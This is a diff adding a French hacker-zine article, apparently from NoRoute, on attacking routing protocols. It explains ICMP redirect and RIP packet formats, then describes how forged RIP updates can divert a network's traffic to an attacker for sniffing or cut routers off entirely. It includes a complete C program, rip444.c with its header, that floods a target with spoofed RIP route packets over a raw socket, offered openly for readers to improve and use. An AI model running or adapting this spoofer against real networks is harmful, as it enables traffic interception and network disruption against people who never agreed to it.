@@ -1,0 +1,578 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%                        Le Detournement  de                                  %
+%                                Trame                                        %
+%                  part-1                   (CoD4)                            %                                 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+1:___ panorama___
+hi , je sais pas si vous etes deja demander quelle moyen nous reste pour
+hacker une machine.  vous vous etes surement rendu compte que il nous plus
+grands chose les machines avec des bug tres simple sont de plus en plus rare
+(phf,etc) je ne dis pas ke demain on ne vas pas trouver The BuG pour
+sendmail 8.8.5 en remote mais forcement il seront tres vite patcher :/
+donc now si on ne manie pas certaine technique assez complexe le hacker
+se retrouve vite au depourvue... mais non ne partez pas vous pendre enfin
+pas encore :).  une solution ? bien sur meme plusieurs :) le NET as ete
+construit autour d'un tres beau protocole k'est le TCP/IP est il se trouve
+que pas mal de bug sont exploitable a commencer par le protocole lui meme
+
+44444444444444444444444444444444444444444444444444444444444444444444444444444
+4 cette article n'est pas un article comme les autres il est le compte rendu4
+4 de kelke travaux que j'ai entreprit tous seul . si j'ecris cette articke  4
+4 c pour vous informez des ces projets . projets qui demande l'effort de    4
+4 TOUS. si vous avez les competences  k'il faut ou autre suggestion ki peut 4
+4 etre utilie contactez moi !!! pas besoin d'etre un HaCKeR pour  participer4
+4 tous pationner d'UNIX de securite peux faire partager son savoir          4
+4 cette experience serat enrichissante pour les 2 camps ! ne voyez plus les 4
+4 HACKER comme des anarchiste voulant tous cassez ou lire votre mail :)     4
+4 se sont bien souvent des passioner de securite et de UNIX bon bon :)      4
+4 donc pour contrib, inscription , contact etc mailler mwa a                4
+4                            boor@hotmail.com                               4
+4 ps: si tu te la joue a la moi 'j'ais fait IUT XXX ''vous comprenez rien'  4
+4 bha va voir le /dev/null si on y'est oki                                  4 
+44444444444444444444444444444444444444444444444444444444444444444444444444444
+(re note: cette article n'est pas garantie contre les erreures loin de la si
+ on de l'ortograve n'en parlons meme poa :) /me c poa ecrire ! donc si vous
+voulez corriger etc maillez mwa a la meme addresse :)                      )
+
+1.1: mais que nous restes t'il ? 
+
+on va commencer par un exemple : la machine Run1 veut fait un telnet sur
+la machine Devil . voyons se  qui se passe 
+
+Run1 ->[routeur]->[gateway]--[internet]--[gateway devil]->[routeur]-> DEVIL
+
+comme vous le voyez  les trame de run1 a DEVIL passe par enormement de
+machine pour vous en convaincre faite donc un traceroute :) .
+oui il est vrai que vous le saviez certainement que toutes les trame
+que vous envoyez  a l'autre bout d'internet  passe par plusieurs machine
+mais c trames ne sont pas envoyez au hasard sur telle ou telle autre machine
+il y'est en gros 3 protocole qui gere toutes les affaires de routage des
+trames. ICMP,RIP,BGP .
+
+1.3: routage et icmp 
+
+regardez bien se la figure la machine 1 dans c table de routage est
+configurer pour envoyer par defaut tous paket k'elle ne peut pas traitez
+au routeur n1 .ok ben imaginons  now que la machine n1 veut envoyer une
+trame a la machine 2  . la trame va allez sur le routeur n1 pis ensuite
+se dernier va envoyer au routeur n2 .  comme on peut le contaster ce 
+n'est pas trop la  meilleure  solution :/ . mais hehe le routeur n1
+n'est pas bete kand il va s'apercevoir de la faute il va envoyer une 
+redirection ICMP . de se faite la machine n2 envairas directement au
+routeur n2 toute les trames ki sont destinais a la machine n2 .
+
+
+               -----------    
+               |machine 1|
+               -----|-----
+                    |
+  ------------------|--------------------------
+        |                        |
+    [routeur 1]             [routeur 2]
+        |                         |
+       \|/                         -----[machine 2]
+                                  |   
+                                 \|/      
+
+1.4 examen de icmp redirect 
+
+    0                   1                   2                   3
+    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |     Type (5)  |  Code(0-3)    |          Checksum             |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |    IP du routeur qui devrait etre utiliser                    |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |  en-tete IP + les 8 octets qui suivent                        |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+la valeur du code est de |  pour
+                       ---------------------------------------------------
+                       0 | redirection pour le reseau
+                       1 | redirection pour la machine
+                       2 | redirection pour le type de service et le rezo
+                       3 | redirection pour le type de service et de machine
+
+examinons les conditions pour que le recepteur d'une redirection icmp
+la prenne en compte. Prem: les redirection doivent etre genrer par les 
+routeurs est non par les machine . de plus on suposse que les redirection
+doivent etre utiliser par des machine est non des routeurs on suppose que
+les routeurs participe avec d'autres routeurs a  un protocole de routage
+(RIP par exemple) et le protocole de routage devrait prevenir le besoin 
+d'utiliser des redirections ( on ne fait ke supposer :) regardons les regle
+que doit suivre une redirection icmp lorsque k'elle est envoyait a une 
+machine ki joue le role de routeur .
+1: le nouveau routeur doit se situer a un reso directement situer  a la
+machine
+2: la redirection doit etre emise par le routeur courant
+3: la redirection ne peut specifier a la machine de s'utiliser elle meme
+comme routeur
+4: la route ki doit etre modifier doit etre une route indirecte
+
+1.5___faille de securite et exploitation___
+
+comment exploiter les redirection icmp ???
+je doit dire que pour le hacker normalle en situation normalle
+l'icmp redirect ne presente aucun interet pour lui a part une attake
+du rezo pour foutre le bordel est rendre le rezo inexploitable mais
+pour un hacker qui se trouve etre dans un rezo securiser il peut grace
+au redirection icmp se faire envoyer des paket ki ne lui sont pas destiner
+2: entrainez un leger ralentisement  du reseau pour favoriser certaine
+operation (spoofing principalement ) car souvent on doit repondre avant
+une machine est si cette machine route c paket n'importe comment il y'a
+plus de chance pour ke le spoof marche =). 
+
+je n'ais surment pas tous mis si vous avez a rajouter meme adresse :)
+
+
+1.6 et pratikement ???
+
+ben c tres simple spoofer de l'icmp est assez simple je ne presenterais
+pas ici un icmp redirection spoofeur car en modifiant le code de icmp444
+vous y arriverais tres facilment pis en cas de veritable probleme
+consulter le RFC sur l'icmp  rfc792
+
+
+______________________________________________________________________________
+2.0 et quoi d'autre ?  (RIP)
+------------------------------------------------------------------------------
+
+comme nous l'avons decrit tous a l'heure votre trame traverse pas mal de
+machine est notament des routeurs  notament vous traversais pas mal de
+routeur inter ( dans une unversite par exemple il n'est pas rare de
+traverser 4 ou 5 routeur avant d'atterir sur le gateway vers l'internet)
+le protocole qui gere les gateway interieure est RIP il existe 2 version
+de RIP nous nous interesseront que la version 1 (si RIP vous passione 
+rfc1085).
+
+2.1 definitions de RIP
+
+
+les messages RIP sont de l'UDP  
+
+       0                   1                   2                     3
+       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+      | command (0-6) | version (1)   |      doit etre a zero (0)     |
+      +---------------+---------------+-------------------------------+
+      | address family (2)            |  doit etre a zero (0)         |
+      +-------------------------------+-------------------------------+
+      |                         IP address                            |
+      +---------------------------------------------------------------+
+      |                       doit etre a  zero (0)                   |
+      +---------------------------------------------------------------+
+      |                        doit etre a zero (0)                   |
+      +---------------------------------------------------------------+
+      |                          metric (1-16 )                       |
+      +---------------------------------------------------------------+ 
+
+voici comment marche  RIP
+au debut de sa mise en marche le demon envoie   un paquet de requete
+(le champ comand prends 1) sur toute les interfaces ou il est connecter
+il s'agit en faite de demander a tous les demon  (demon de routage)
+de nous renvoyer leur table complete de routage comme ca il va pouvoir
+maitre a jour la sienne est avoir une idee de se ki se passe les table
+sont souvent mis a jour toutes 30 seconde environt les routeurs s'envoie
+une partie ou l'integralite de leur table de routage
+
+2.2 les tables de routage
+
+deja il faut savoir ce ke veut dire metric regardez l'exmple
+
+123.123.4.0
+----------------------------------------
+                  |
+               ------
+                 R1
+                -----
+                  |     123.123.1.0
+     ---------------------------------------
+                         |
+                       -----
+                         R2
+                        ----
+                          |        123.123.2.0
+            --------------------------------------
+				
+voila toute les 30 seconde a peut un messge de brodcast RIP est envoyez
+ ex: R1 dis  sur le reseau 123.123.1.0 ki peut acceder au reseau 123.123.4.0
+ est il precise ke sont comteur de saut est as 1 ( vui car le reseau na a
+ ka sauter k'un reseau :)  est inversement il dit sur 123.123.4.0 ki peut
+acced a 123.123.1.0 avec une metrique de 1 vala c aussi bete que ca 
+
+voila maitenant regardons a kwa ressemble une table de routage (on utilise ripquery pour cela )
+
+TiA$ ripquery -n <ip du routeurs>   (on va dire R2)
+      ...
+      123.123.1.0 metric 1
+      123.123.4.0 metric 2
+      123.123.2.0 metric 1
+      ...
+notez  que se n'est qu'en exemple est que vous recevrais beaucoup plus
+de chose a'moins d"'avoir un reseau extrement petit :)
+
+2.3 et concretement ?.?
+
+ faire c propre pakets RIP n'est poa dur . 
+
+la valeur du champ command prends __|________
+                                   1| pour envoyer une requete d'envoi de table 
+                                   2| pour repondre ou maitre a jour 
+                                       
+      
+la valeur du champs version prends le numero de version de RIP
+
+voici un entete RIP
+  0                   1                   2                     3
+       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+      | command (0-6) | version (1)   |      doit etre a zero (0)     |
+      +---------------+---------------+-------------------------------+
+ 
+ maitenant regardons sous quelle format on doit envoyer les tables de
+ routages
+ 
+      +---------------+---------------+-------------------------------+
+      | address family (2)            |  doit etre a zero (0)         |
+      +-------------------------------+-------------------------------+
+      |              addresse IP du reseau accesible                  |
+      +---------------------------------------------------------------+
+      |                       doit etre a  zero (0)                   |
+      +---------------------------------------------------------------+
+      |                        doit etre a zero (0)                   |
+      +---------------------------------------------------------------+
+      |                          metric (1-16 )                       |
+      +---------------------------------------------------------------+
+
+le champs address family prends 2 dans notre Cas
+
+le champ addresse IP prends la valeur du reseau accesible 
+
+la champ metric bien je vous laisse deviner tient :))
+
+RIP peut envoyer 25 route par paket
+
+-(voici un exemple plus parlant )-
+
+ceci est le paquet ke le routeurs R2 a envoyer au reseau 123.123.1.0
+
+(oui RIP ne reponds pas A UN routeur mais il repond a TOUS le reseau en 
+utilisant le broadcasting "il envoye sont paquete a 123.123.1.255 )
+
+comme c'est un paquet qui va servir a informer le reseau 123.123.1.0
+la valeur commande prends 2 
+
+       0                   1                   2                     3
+       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+      | command (2 )  | version (1)   |      doit etre a zero (0)     |
+      +---------------+---------------+-------------------------------+
+      | address family (2)            |  doit etre a zero (0)         |
+      +-------------------------------+-------------------------------+
+      |                       123.123.2.0                             |
+      +---------------------------------------------------------------+
+      |                       doit etre a  zero (0)                   |
+      +---------------------------------------------------------------+
+      |                        doit etre a zero (0)                   |
+      +---------------------------------------------------------------+
+      |                          metric (1 )                          |
+      +---------------------------------------------------------------+
+      +---------------+---------------+-------------------------------+
+      | address family (2)            |  doit etre a zero (0)         |
+      +-------------------------------+-------------------------------+
+      |                       123.123.4.0                             |
+      +---------------------------------------------------------------+
+      |                       doit etre a  zero (0)                   |
+      +---------------------------------------------------------------+
+      |                        doit etre a zero (0)                   |
+      +---------------------------------------------------------------+
+      |                          metric (3)                           |
+      +---------------------------------------------------------------+
+comme vous le voyez on as envoyez 2 routes 
+
+
+2.4 RIP !
+
+RIP est un protocole de ROUTAGE donc il sert au routeur a se metre
+constament a jour comme ca si un routeur tombe en panne ou tous simplements
+pour choisir le meilleure chemin que doit suivre le paquets comme vous en
+doutez RIP est pas bete si il recois d'un routeur adjacent a lui (routeurs
+n2 par exemple) qui peut atteindre telle reseau avec une  metrique de 1 ben
+se dernier va routet les paket des facon optimum vala kwa :)
+
+2.5 RIP Spoofing 
+
+concretements a quoi peut nous servir a spoofer RIP hehe 1 a routez les
+pakets d'un reseau interne comme bon vous semble DEJA si vous faite croire a
+t'elle routeur que vous pouvez atteindre telle reseau avec une metrique de 1
+ben il va vous envoyez tous les paquets !! qui ne demanderons qu'a etre
+sniffer ! il est vrai que la methodes est quand meme assez delicate car les
+routeurs vont bien s'apercevoir ke il y'a un probleme  en faite il faudrait 
+carrement flooder le reseau de fausse informations comme ca si une
+informations dite juste arrive bien elle sera imediatements annuler grace a
+votre flood permanents  
+mais le RIP spoofing peut servir a faire une attake sur un reseau en efait
+si vous envoyer des route avec une metrique de 16 cela veut dire que la
+route n'est plus bonne donc il tres facile de faire croire a un routeur ke
+il est couper du monde totalment !! vous permentant comme de reussir d'autre
+type d'attake spoof de rlogin etc.
+je pense que le RIP spoofing est dans c premiers pas mais bientot avec
+l'arrive de GROS reseau interne le RIP spoofing pourait bien etre un moyen
+de sniffer une grosse partie du reseau assez simplement comme pour l'icmp 
+redirection je ne pense pas avoir pus parlez de tous les aspect du RIP 
+mais regardez deja se k'en dis les specialiste :)
+
+/************************************************************************/
+   RIP Spoofing
+     
+     By sending forged RIP packets, an intruder can change the routing
+     for a network connection, allowing sniffing, spoofing, hijacking,
+     and dropping packets on the connection not originally going through
+     a network. Vulnerable machines are ones running non-authenticated
+     RIP.
+     
+     RIP is a commonly used method for a local network to share routing
+     information. An intruder can inject false routing packets into the
+     routing table on the host, forcing packets to be sent to the
+     intruder&#146;s machine for reading or modification. RIP is
+     commonly used by the routed service. The scanner tries to add an
+     entry to the router&#146;s target routing table.
+     
+     Risk: Medium/High
+/************************************************************************/
+
+sympa nan :)
+
+
+ 
+2.6: PRATIQUE !
+
+j'ai inclue un tit spoofeur de RIP qui vous fait des petit pakes RIP spoofer
+bon comme la version l'indique c la beta beta beta  il faut l'adpter
+j'attends vos reactions pour l'ameliorer :)  sinon modifier deux ou trois ti
+truc pour rendre la chose plus facil vala bon passons au code :)
+
+/*
+ essaie du rip spoofeur ver 0.0
+(c) CoD4
+
+usage: rip444 <ip de destination> <ip source> <ip de la route >
+*/
+
+
+
+
+
+#define IPHDRSIZE sizeof(struct iphdr)
+#define  UDPHDRSIZE sizeof(struct udphdr)
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <syslog.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
+#include <netinet/ip_icmp.h>
+#include "rip.h"
+#ifdef SYSV
+#define bcopy(s1,s2,len) memcpy(s2,s1,len)
+#endif
+
+
+/*
+ * in_cksum --
+ *  Checksum routine for Internet Protocol family headers (C Version)
+ */
+unsigned short in_cksum(addr, len)
+    u_short *addr;
+    int len;
+{
+    register int nleft = len;
+    register u_short *w = addr;
+    register int sum = 0;
+    u_short answer = 0;
+ 
+    /*
+     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
+     * sequential 16 bit words to it, and at the end, fold back all the
+     * carry bits from the top 16 bits into the lower 16 bits.
+     */
+    while (nleft > 1)  {
+        sum += *w++;
+        nleft -= 2;
+    }
+ 
+    /* mop up an odd byte, if necessary */
+    if (nleft == 1) {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+    }
+ 
+    /* add back carry outs from top 16 bits to low 16 bits */
+    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
+    sum += (sum >> 16);         /* add carry */
+    answer = ~sum;              /* truncate to 16 bits */
+    return(answer);
+}
+
+
+
+unsigned int host2ip(char *serv)
+{
+   struct sockaddr_in sin;
+   struct hostent *hent;
+      
+  hent=gethostbyname(serv);
+  if(hent == NULL) return 0;
+  bzero((char *)&sin, sizeof(sin));
+  bcopy(hent->h_addr, (char *)&sin.sin_addr, hent->h_length);
+  return sin.sin_addr.s_addr;
+ }
+#define RIPHDRSIZE 24
+                     
+main(int argc, char **argv)
+   {
+        struct sockaddr_in sin_dst;
+	unsigned char packet[4098];
+	struct iphdr   *ip;
+	struct udphdr *udp;
+	struct riphdr *rip;
+	
+	
+	 unsigned           s_port;
+	 unsigned           t_port;
+                               
+	int s;
+        int i;
+	int DATA;
+	
+	ip = (struct iphdr *)packet;
+	udp = (struct udphdr *)(packet+IPHDRSIZE);
+        rip = (struct riphdr *)(packet+IPHDRSIZE+UDPHDRSIZE);
+        
+	memset(packet, 0, 4098);
+	
+	printf(" ICMP444 ready for action ! CoD4 #PhE\n");
+	/* OPEN A RAW_SOCKET ! */;
+	
+	 s=socket(AF_INET, SOCK_RAW, 255);
+	        if(s < 0)
+	        {
+	        fprintf(stderr, "cant open raw socket\n");
+	        exit(0);
+	        }
+	
+	#ifdef IP_HDRINCL
+	 if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i)) < 0)
+	      {
+	        fprintf(stderr, "cant set IP_HDRINCL\n");
+	         close(s);
+	        exit(0); }
+	#endif
+	                                                    
+	
+	
+	
+	ip->saddr    = host2ip(argv[2]);
+	ip->daddr    = host2ip(argv[1]);
+	ip->version  = 4;
+	ip->ihl      = 5; 
+	ip->ttl      = 255;
+	ip->protocol = 17; 
+	ip->tot_len  = htons(28+24);
+	ip->tos      = 0;
+	ip->id       = 0;
+	ip->frag_off = 0;
+	ip->check    = in_cksum(packet,IPHDRSIZE);
+	
+	udp->source=htons(1234);
+	udp->dest=htons(520);
+	udp->len=UDPHDRSIZE+RIPHDRSIZE;
+	
+	rip->command=2;
+	rip->version=1;
+	rip->address_family=2;
+	rip->addresse_ip=host2ip(argv[3]);
+	rip->metrique=1;
+	
+	sin_dst.sin_addr.s_addr = ip->daddr;
+        sin_dst.sin_family = AF_INET; 
+
+	for(;;){
+
+	sendto(s,packet,IPHDRSIZE+UDPHDRSIZE+RIPHDRSIZE,0,
+          (struct sockaddr *)&sin_dst,sizeof(struct sockaddr)); 
+	
+	usleep(10000);
+	
+	printf(" hop la un tit paket :) \n "); }
+    
+
+
+
+}
+
+---------------------rip444.c-end------------------------------------------ 
+
+
+
+----------------------rip.h-begin------------------------------------------
+ struct riphdr {
+ 
+unsigned char command ;
+unsigned char version ;
+unsigned char domaine_de_routage;
+unsigned int address_family;
+unsigned int route_tag;
+unsigned long addresse_ip;
+unsigned long masque_de_subnet;
+unsigned long addr_ip_du_saut_suivant;
+unsigned long metrique;
+
+}  ;  
+
+-----------------------rip.h-end------------------------------------------
+
+
+3.0 BGP
+
+hum alors la BGP c'est en gros le RIP des gateway exterieures
+la c le protocole qui perment la communications des reseaux autonomes
+bon la je peux pas vous racontez grands chose car je ne sais presque rien 
+sur c protocole et c la que je demande votre  aide si vous avez envie de me
+faire partarger se que vous savez mail me :) j'en serais grandements
+reconaissant mais bon si personne m'aide vous inquietez pas je vais trouvez
+ca de toute facon pour le prochain noroute :)
+
+3.1 est avec BGP ca serat kwa le trip ?
+
+hum allors la c carrment le big trip !!  on pouras carrement regler
+les gateway comme NOUS on le veux  genre amenez a  votre machine
+toutes  les donner d'un reseau ou meme 2 , 3 ! c le RIP mais en plus gros :)
+voila pourkwa je suis tres enthousiate est j'espere que vous aussi !
+imaginez le trip que sa serait :)
+
+4.0 CONCLUSION 
+hehe comme vous l'avez vu sa promet pas mal nan? vala  comme vous l'avez 
+vu j'ai expliker rapidement c protocoles si vous en voulez plus est que
+comme moi vous savez a peine causer l'anglais :p je vous conseil un bookin
+"tcp/ip illustre" c carrment mon livre de chevet c THE bible :) 
+bon mais amis esperons que mon appelle serat entendue est a bientot dans un
+prochain NoRoute pour la suite :)
+
+CoD4 - CoD4 - CoD4 - CoD4 <<<<<< hehehe je suis megalo :)))))))))
+
